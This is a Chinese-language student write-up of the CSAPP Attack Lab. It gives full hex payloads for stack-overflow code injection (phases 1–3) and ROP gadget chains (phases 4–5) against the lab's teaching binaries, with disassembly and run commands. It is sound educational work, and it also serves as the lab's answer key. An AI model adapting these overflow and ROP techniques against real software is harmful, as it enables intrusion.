# 前言

閱讀此篇題解需要有CSAPP第三章基礎，對於基本匯編指令本文不做過多說明。嘗試Lab前應先下載官方提供的[Writeup](https://csapp.cs.cmu.edu/3e/attacklab.pdf)並在開始每一階段前閱讀相應內容，否則容易一頭霧水。

注意，因為我們是在本地運行Lab，所以運行程序時要加上參數`-q`，告訴程序不上數據傳到伺服器，否則無法運行。

筆者學識稍淺，若有疏漏或錯誤處，歡迎各位大佬指正。

# Phase_1

文檔給了`test`函數的C代碼：

``` c
void test()
{
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

還給了`touch1`函數的代碼：

```c
void touch1()
{
    vlevel = 1; /* Part of validation protocol */
    printf("Touch1!: You called touch1()\n");
    validate(1);
    exit(0);
}
```

題目要求當`getbuf`返回時不返回到下一行的`printf`，而是跳轉到`touch1`運行。

首先查看`getbuf`的反彙編代碼：

``` C
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop
```

`0x4017a8`處指令開闢了大小`0x28 = 40`(字節)的棧空間，然後將棧頂作為參數(`%rdi`)傳給`Gets`函數。

我們需要在輸入時輸入48字節的內容讓棧溢出，使返回地址被覆蓋為`touch1`的內存地址。

``` C
00000000004017c0 <touch1>:
  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
  4017cb:	00 00 00 
  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi
  4017d3:	e8 e8 f4 ff ff       	callq  400cc0 <puts@plt>
  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
  4017dd:	e8 ab 04 00 00       	callq  401c8d <validate>
  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
  4017e7:	e8 54 f6 ff ff       	callq  400e40 <exit@plt>
```

查看代碼我們可以發先`touch1`首行指令在地址`0x4017c0`處，這是我們想讓代碼從`getbuf`返回的地址。(注意，因為機器採小端序，在輸入時應輸入`C0 17 40 00`)

由此，我們可以構建出shellcode：

``` C++
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
C0 17 40 00
```

我們將這段內容保存在檔案`phase_1`中，然後使用lab提供的工具`hex2raw`將其轉換成程序接受的`string`類型。

注意，運行`ctarget`前要加上`-q`，防止因為程序連接不上伺服器而報錯。

``` shell
./hex2raw < phase_1 | ./ctarget -q
```

![[Pasted image 20250514231027.png]]

# Phase_2

查看文檔，發現給出的`touch2`函數要求傳入一個無符號數，並檢查該輸入是否與`cookie`相等。

``` C++
void touch2(unsigned val) {
	vlevel = 2;
	if (val == cookie) {
		printf("Touch2!: You called touch2(0x%.8x)\n", val);
		validate(2);
	}
	else {
		printf("Misfire: You called touch2(0.x%8x)\n", val);
		fail(2);
	}
	exit(0);
}
```

``` C
00000000004017ec <touch2>:
  4017ec:	48 83 ec 08          	sub    $0x8,%rsp
  4017f0:	89 fa                	mov    %edi,%edx
  4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc <vlevel>
  4017f9:	00 00 00 
  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 <cookie>
  401802:	75 20                	jne    401824 <touch2+0x38>
  401804:	be e8 30 40 00       	mov    $0x4030e8,%esi
  401809:	bf 01 00 00 00       	mov    $0x1,%edi
  40180e:	b8 00 00 00 00       	mov    $0x0,%eax
  401813:	e8 d8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
  401818:	bf 02 00 00 00       	mov    $0x2,%edi
  40181d:	e8 6b 04 00 00       	callq  401c8d <validate>
  401822:	eb 1e                	jmp    401842 <touch2+0x56>
  401824:	be 10 31 40 00       	mov    $0x403110,%esi
  401829:	bf 01 00 00 00       	mov    $0x1,%edi
  40182e:	b8 00 00 00 00       	mov    $0x0,%eax
  401833:	e8 b8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
  401838:	bf 02 00 00 00       	mov    $0x2,%edi
  40183d:	e8 0d 05 00 00       	callq  401d4f <fail>
  401842:	bf 00 00 00 00       	mov    $0x0,%edi
  401847:	e8 f4 f5 ff ff       	callq  400e40 <exit@plt>
```

首先查看代碼可以知道`touch2`函數開頭地址為`0x4017ec`。在Lab文件夾內有一個文件叫`cookie.txt`，裡面存放著我們需要的`cookie`值。

![[Pasted image 20250515224928.png]]

因為我們要將`cookie`值傳給`touch2`，回想CSAPP第三章內容可以知道，函數的第一個參數存放在`%rdi`中。所以我們需要執行以下代碼：

``` C
movq $0x59b997fa, %rdi
```

然後我們要調用`touch2`函數，即`0x4017ec`地址處。這裡我們不使用`call`或`jmp`而使用`ret`，因為偏移不好計算。注意，`ret`指令會跳轉到棧頂保存的地址，並將該地址出棧(`pop`)。

``` C
pushq $0x4017ec
ret
```

將三行彙編代碼結合在一起，就成功達成調用函數的功能了。我們將這段代碼保存在`phase_2_asm.s`中，然後使用指令：

``` shell
gcc -c phase_2_asm.s
objdump -d phase_2_asm > phase_2_asm.asm
```

打開phase_2_asm.asm，可以發現對應的機器代碼。

``` C
phase_2_asm.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	68 ec 17 40 00       	pushq  $0x4017ec
   c:	c3                   	retq   
```

即：

``` C
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 
```

有這些還不夠，因為這些數據在輸入後會被儲存在棧中，所以會被視為數據而非代碼的一部份。所以我們利用棧溢出將棧中原本的儲存地址覆蓋成棧頂(用戶輸入數據的存儲起始點)的位置，即可讓該段代碼被值行。(即將`%rip`設置為`%rsp`)

通過gdb查看，我們可以發現用戶輸入數據的存儲起始點在`0x5561dc78`處。

![[Pasted image 20250515231438.png]]

利用0填充空間後，我們可以構建出shellcode並將其保存在phase_2中：

``` C
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55
```

利用以下代碼驗證其正確性：

``` Shell
./hex2raw < phase_2 | ./ctarget -q
```

![[Pasted image 20250515231728.png]]

# Phase_3

查看文檔，發現這題需要給`hexmatch`函數傳入一個等於`cookie`的字符串，其中字符串應傳入首字符的地址(`char *`)。

``` C
int hexmatch(unsigned val, char *sval) {
	char cbuf[110];
	char *s = cbuf + random() % 100;
	sprintf(s, "%.8x", val);
	return strncmp(sval, s, 9) == 0;
}
```

``` C
void touch3(char *sval) {
	vlevel = 3;
	if (hexmatch(cookie, sval)) {
		printf("Touch3!: You called touch3(\"%s\")\n", sval);
		validate(3);
	}
	else {
		printf("Misfire: You called touch3(\"%s\")\n", sval);
		fail(3);
	}
	exit(0);
}
```

首先查看`touch3`的地址：`0x4018fa`。`cookie`的值在`phase_2`就找到過了：`0x59b997fa`。文檔中說明傳入的`cookie`字符串不應包含前綴的`0x`，所以實際要傳入的字符串應為：`59b997fa`。

注意，通過查看文檔，我們可以發現一句話："When functions `hexmatch` and `strncmp` are called, they push data onto the stack, overwriting portions of memory that held the buffer used by `getbuf`. As a result, you will need to be careful where you place the string representation of your cookie. "。即當`hexmatch`和`strncmp`被調用時會將數據入棧，可能會覆蓋`getbuf`的部分內容，需要小心選擇字符串儲存地址。

意即避免將字符串存放在`getbuf`的棧幀內，故此我們選擇將其存放在`test`的棧幀內。

![[Pasted image 20250519124311.png]]

查看`test`的棧底：`0x5561dca8`。

參考`phase_2`我們可以編寫出以下彙編代碼，並將其轉換為機器代碼：

``` C
0000000000000000 <.text>:
    0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
    7:	68 fa 18 40 00       	pushq  $0x4018fa
    c:	c3                   	retq  
```

到目前為止，我們可以寫出以下與`phase_2`雷同的shellcode：

```C
48 c7 c7 a8 dc 61 55 68 
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
78 dc 61 55
```

由於我們的字符串應儲存在`0x5561dca8`，而儲存我們輸入的首地址在`0x5561dc78`，所以我們應該給輸入的最後一行填充0並在下一行處填入`cookie`字符串。

回想字符串如何儲存：利用ASCII表示字符。

將`cookie`轉換為ASCII碼後為：`35 39 62 39 39 37 66 61`

至此，我們的shellcode就構建出來了：

``` C
48 c7 c7 a8 dc 61 55 68 
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61
```

創建文件`phase_3`並將shellcode存放在該的文件中，測試：

![[Pasted image 20250519125232.png]]

# Return-Oriented Programming 概念補充

下個階段不能使用前三個階段的代碼注入(Code Injection)技術，因為：
* 使用地址隨機化技術，導致每次運行時棧的地址都不同，使得難以定位注入的代碼。
* 將棧的內存設置為不可執行，所以就算可以將PC設置為注入代碼的地址，程序也會返回segmentation fault。

故，下兩階段會用到ROP知識(Return-Oriented Programming)。

ROP使用的概念是找出程序中的特殊幾個字節，即我們想要執行的代碼與`ret`，我們稱這種片段**gadget**(`ret`指令用來跳轉到下一個gadget)。

![[Pasted image 20250520162005.png]]

上圖說明了如何在棧中設置並執行一連串的gadget，其中`0xc3`表示指令`ret`。當每個gadget運行到`ret`時，會從棧頂取出下一個gadget的地址並執行，使得整個gadget鏈被完整執行。

用以下例子舉例：

``` C
void setval_210 (unsigned *p) {
	*p = 3347663060U;
}
```

``` C
0000000000400f15 <setval_210>:
  400f15:       c7 07 d4 48 89 c7    movl  $0xc78948d4, (%rdi)
  400f1b:       c3                   retq
```

字節序列`48 89 c7`就可以組成指令`movq %rax, %rdi`，並且這個序列最後還跟隨了一個`c3`，也就是`ret`。我們的目標序列在地址`0x400f18`處，所以如果直接跳轉到`0x400f18`處就可以執行我們想要執行的指令。

# Phase_4

此題與phase_2雷同，只是開啟了保護。因為無法在棧上執行代碼，所以我們使用ROP。

在此我們想使用gadget實現以下功能：

``` C
movq $0x59b997fa, %rdi
pushq $0x4017ec
ret
```

但是顯然gadget中不會包含我們需要的立即數(如：`0x59b997fa`)。換個思路，我們可以將數據存放在棧中，然後使用`popq`取得數值。搜尋`popq %rdi`對應的機器代碼`5f`，發現無法在有效區內找到。我們換個思路，可以嘗試用一個中轉寄存器儲存這個值：

``` C
gadget1: 
popq %rax
ret

gadget2: 
mov %rax, %rdi
ret
```

![[Pasted image 20250520175104.png]]

查看上圖可發現，對應機器代碼為：`58 c3`與`48 89 c7 c3`。通過搜索我們可以找到以下兩個函數：

``` C
00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3                   	retq  
```

``` C
00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	retq 
```

通過在`0x4019cc`截斷第一個函數可以構成`gadget1`(`90`為`nop`，即no operation)，在`0x4019a2`截斷第二個函數可以構成`gadget2`。

理想狀態下，我們期望棧的狀態如下：

``` C
---- Stack ----
-------------
full of zero | getbuf的棧幀
-------------
gadget1      | test的棧幀 (getbuf的返回地址)
cookie       |
gadget2      |
touch2       |
-------------
---------------
```

當`getbuf`執行`ret`後，會跳轉到`gadget1`並將其地址出棧。

這時`gadget1`中的`pop`就會將cookie值從棧頂取出，然後跳轉到`gadget2`繼續執行。

故此，我們可以構建出以下shellcode，並保存在phase_4中：

``` C
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
cc 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
a2 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```

驗證正確性：

![[Pasted image 20250520174304.png]]

# Phase_5

終於到這個階段了，可以先休息一波。官方文檔還溫馨提示我們：已經得到了95/100的分數，這是一個很棒的分數了。如果大家有甚麼其他更重要的事情可以先放下這個lab去做啦！因為這個階段只佔可憐的5分，不值得我們耗費這麼多時間去解答它，除非我們將它視為額外的挑戰任務，想要超越這門課程對普通學生的期待程度。

既然如此，各位看官若是手頭上有其他事情要做，就可以關閉這份題解啦！否則，我們還有路要走喔。

因為地址隨機，所以想要獲取字符串的儲存地址應該使用`%rsp + <bias>`的形式取得。

我們想要實現以下功能：

``` C
mov %rsp, %rax
add $bias, %rax
mov %rax, %rdi
call touch3
```

但是尋找後發現沒有`add`的機器碼，我們可以使用另一個函數代替。

``` C
00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	retq 
```

因為某些`mov`指令的源或目標寄存器的機器碼不存在程序中，所以我們需要通過一些過渡寄存器來傳遞這些值。相信各位在經歷phase 4後，已經可以獨立尋找到相應的機器碼地址。此處便不再重述，直接給出棧的樣子 (省略各gadget的`ret`指令)。

``` C
---- Stack ----
--------------------------------------------
full of zero                                | getbuf的棧幀
--------------------------------------------   
mov %rsp, %rax: 0x401a06                    | test的棧幀 (getbuf的返回地址)
mov %rax, %rdi: 0x4019a2                    |
pop %rax: 0x4019cc                          |
bias: 8 * 9 = 72 (0x48)                     |
mov %eax, %edx: 0x4019dd                    |
mov %edx, %ecx: 0x401a70                    |
mov %ecx, %esi: 0x401a27                    |
lea (%rdi, %rsi, 1), %rax: 0x4019d6         |
mov %rax, %rdi: 0x4019a2                    |
Address of touch3: 0x4018fa                 |
ASCII of cookie: 35 39 62 39 39 37 66 61 00 |
--------------------------------------------
---------------
```

注意此處偏移量的計算：執行`mov %rsp, %rax`時，`%rsp`其實正指向存放`mov %rax, %rdi`的棧內存。回憶`ret`指令相等於以下兩條指令`pop %rsp`+ `jmp %rsp`，所以執行第一個gadget時，`%rsp`正指向第二個gadget的內存地址。從第二個gadget算起，到cookie字符串儲存的地址，中間隔了9個8字節的大小，所以偏移量為$8 \times 9 = 72 (0x48)$。

以上，可以構建出shellcode：

``` C
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
cc 19 40 00 00 00 00 00
48 00 00 00 00 00 00 00
dd 19 40 00 00 00 00 00
70 1a 40 00 00 00 00 00
27 1a 40 00 00 00 00 00
d6 19 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61
```

驗證正確性：

![[Pasted image 20250527001204.png]]

至此，五個階段全部完結。

# 後記

終於完結此篇題解，時間拖得有些久，因為進入大學的準備忙得焦頭爛額。最近才知道錄取的是專業大類且沒法依個人意願自由分流，也就是說進入學校後還需二次分流，筆者很難依意願進入喜愛的計算機了。正考慮繼續就讀本地大學或申請國外大學兩條路，若選擇繼續就讀本地大學，以後更新頻率可能會創下新低，只能使用課餘時間研究。等於回到高中時期，既要顧課業也要顧興趣。最近也要為分流考試準備，預習數學與刷題，可能更新頻率也不會太高。

最後，謝謝你願意看我的後記碎碎念。